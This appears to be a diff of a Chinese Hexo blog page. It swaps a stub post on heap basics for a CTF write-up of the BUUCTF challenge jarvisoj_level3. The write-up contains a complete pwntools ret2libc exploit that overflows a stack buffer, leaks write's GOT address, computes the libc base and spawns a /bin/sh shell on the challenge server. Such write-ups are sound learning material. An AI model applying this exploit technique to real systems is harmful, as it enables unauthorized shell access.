@@ -17,21 +17,21 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>堆的概念 | solo</title>
-  <meta name="description" content="​    刷的题总将到堆的记录下,熬了有点久的才废了一点点,下面总结一下我对堆的理解,可能有点不明确，请见凉! ​                                                                                                                                        —-自己学习记">
+  <title>buuctf-jarvisoj_level3 | solo</title>
+  <meta name="description" content="jarvisoj_level3查看保护 123456[*] &amp;#x27;&#x2F;home&#x2F;king&#x2F;study&#x2F;ctf&#x2F;pwn&#x2F;buu&#x2F;1&#x2F;level3&amp;#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO				    Stack:    No canary found				&#x2F;&#x2F;没开    NX:       NX enabled">
 <meta property="og:type" content="article">
-<meta property="og:title" content="堆的概念">
-<meta property="og:url" content="http://example.com/2022/03/09/%E5%A0%86%E7%9A%84%E6%A6%82%E5%BF%B5/index.html">
+<meta property="og:title" content="buuctf-jarvisoj_level3">
+<meta property="og:url" content="http://example.com/2022/03/14/buuctf-jarvisoj-level3/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="​    刷的题总将到堆的记录下,熬了有点久的才废了一点点,下面总结一下我对堆的理解,可能有点不明确，请见凉! ​                                                                                                                                        —-自己学习记">
+<meta property="og:description" content="jarvisoj_level3查看保护 123456[*] &amp;#x27;&#x2F;home&#x2F;king&#x2F;study&#x2F;ctf&#x2F;pwn&#x2F;buu&#x2F;1&#x2F;level3&amp;#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO				    Stack:    No canary found				&#x2F;&#x2F;没开    NX:       NX enabled">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-03-09T06:02:11.000Z">
-<meta property="article:modified_time" content="2022-03-10T02:44:27.755Z">
+<meta property="article:published_time" content="2022-03-14T14:55:54.000Z">
+<meta property="article:modified_time" content="2022-03-14T14:56:35.081Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="buuctf-pwn">
 <meta name="twitter:card" content="summary">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://example.com/2022/03/09/%E5%A0%86%E7%9A%84%E6%A6%82%E5%BF%B5/index.html">
+  <link rel="canonical" href="http://example.com/2022/03/14/buuctf-jarvisoj-level3/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -341,14 +341,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-堆的概念" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-buuctf-jarvisoj-level3" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      堆的概念
+      buuctf-jarvisoj_level3
     </h1>
   
 
@@ -356,33 +356,47 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2022/03/09/%E5%A0%86%E7%9A%84%E6%A6%82%E5%BF%B5/" class="article-date">
-	  <time datetime="2022-03-09T06:02:11.000Z" itemprop="datePublished">2022-03-09</time>
+	<a href="/2022/03/14/buuctf-jarvisoj-level3/" class="article-date">
+	  <time datetime="2022-03-14T14:55:54.000Z" itemprop="datePublished">2022-03-14</time>
 	</a>
 </span>
         
         
   <span class="article-tag">
     <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+	<a class="article-tag-link-link" href="/tags/buuctf-pwn/" rel="tag">buuctf-pwn</a>
   </span>
 
 
         
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/03/09/%E5%A0%86%E7%9A%84%E6%A6%82%E5%BF%B5/#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/03/14/buuctf-jarvisoj-level3/#comments" class="article-comment-link">评论</a></span>
         
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <p>​    刷的题总将到堆的记录下,熬了有点久的才废了一点点,下面总结一下我对堆的理解,可能有点不明确，请见凉!</p>
-<p>​                                                                                                                                        —-自己学习记录</p>
-<h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆?"></a>什么是堆?</h2><p>​        以我的理解就是,堆是可以在程序中提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域,他由低地址向高地址方向增长.学过C语言的其实你也是可以看成结构体数组,然后数组每个元素都会开辟一块内存来储存数据,那么这块用来储存数据的内存就是堆。结构体在BSS段上,其内容就是堆的地址,也就是堆的指针.</p>
-<p>讲讲函数吧！</p>
-<p>申请内存(malloc函数)</p>
-<p>释放内存(free函数)</p>
-<p>突然没灵感了!</p>
+        <h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>查看保护</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/king/study/ctf/pwn/buu/1/level3&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO				</span><br><span class="line">    Stack:    No canary found				//没开</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)			//没开</span><br></pre></td></tr></table></figure>
+
+<p>运行了一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./level3</span><br><span class="line">Input:</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Hello, World!</span><br></pre></td></tr></table></figure>
+
+<p>这种一般就是溢出加泄漏地址计算出libc的地址来达到getshell</p>
+<p>话不多说看伪代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]		//溢出</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一看就是这个是基本功</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26390</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">main=<span class="number">0x0804844B</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">offset=write_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+offset</span><br><span class="line">sh=libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()+offset</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(system)+<span class="string">&#x27;aaaa&#x27;</span>+p32(sh)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>以下是最主要的:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>记得write的调用参数的使方法吧！</p>
+<p>以下就是参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(1)+p32(write_got)+p32(4)</span><br></pre></td></tr></table></figure>
+
+<p>总结:<br>很基础的一题</p>
 
       
     </div>
@@ -392,7 +406,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://example.com/2022/03/09/%E5%A0%86%E7%9A%84%E6%A6%82%E5%BF%B5/" title="堆的概念" target="_blank" rel="external">http://example.com/2022/03/09/堆的概念/</a>
+      <a href="http://example.com/2022/03/14/buuctf-jarvisoj-level3/" title="buuctf-jarvisoj_level3" target="_blank" rel="external">http://example.com/2022/03/14/buuctf-jarvisoj-level3/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -438,13 +452,9 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/2022/03/10/buuctf-babyheap-0ctf-2017/" title="buuctf-babyheap-0ctf-2017"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/2022/01/16/buuctf-ciscn-2019-n-5/" title="buuctf-ciscn_2019_n_5"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2022/03/12/buuctf-ciscn-2019-es-2/" title="buuctf-ciscn_2019_es_2"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
